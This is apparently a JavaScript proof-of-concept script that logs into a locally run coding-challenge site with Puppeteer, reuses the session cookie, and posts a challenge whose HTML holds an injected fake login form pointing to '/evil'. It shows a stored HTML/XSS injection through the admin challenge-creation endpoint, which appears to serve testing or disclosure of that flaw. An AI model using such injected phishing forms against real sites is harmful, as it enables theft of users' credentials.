import puppeteer from 'puppeteer';

const login = async () => {
  const browser = await puppeteer.launch({
    headless: false,
    executablePath: '/usr/lib/chromium/chromium',
    userDataDir: './test'
  });
  const page = await browser.newPage();
  await page.goto('http://127.0.0.1:2005/auth/discord');
  await page.waitForSelector('.em_container');
  const cookies = await page.cookies();
  await page.close();
  await browser.close();
  return cookies.find((c) => c.name === 'engineerman.sid');
};

(async () => {
  console.log('Log in with an account that has add challenges permission');
  const cookie = await login();

  console.log('XSS Attack');

  const body = {
    draft: 0,
    difficulty: 1,
    points: 10,
    name: 'XSS injected',
    description: 'XSS injected',
    html: `
      <form action="/evil" method="post">
      <label>Username</label>
      <input type="text">
      <label>Password</label>
      <input type="password">
      <input type="submit" value="Log in">
      </form>
      `,
    tests: [{ challenge_id: -1, name: '12', input: '12', output: '12', index: 0 }]
  };

  const res = await fetch('http://127.0.0.1:2005/admin/challenges/create', {
    credentials: 'include',
    headers: {
      Accept: 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'no-cors',
      'Sec-Fetch-Site': 'same-origin',
      'Content-Type': 'application/json;charset=utf-8',
      Pragma: 'no-cache',
      'Cache-Control': 'no-cache',
      Cookie: `${cookie.name}=${cookie.value}`
    },
    referrer: 'http://127.0.0.1:2005/admin/challenges/create',
    body: JSON.stringify(body),
    method: 'POST',
    mode: 'cors'
  });

  console.log({ statusText: res.statusText });
  console.log(
    'If the attack is successful, you will see a new challenge called "XSS injected" with an unsafe form'
  );
})();
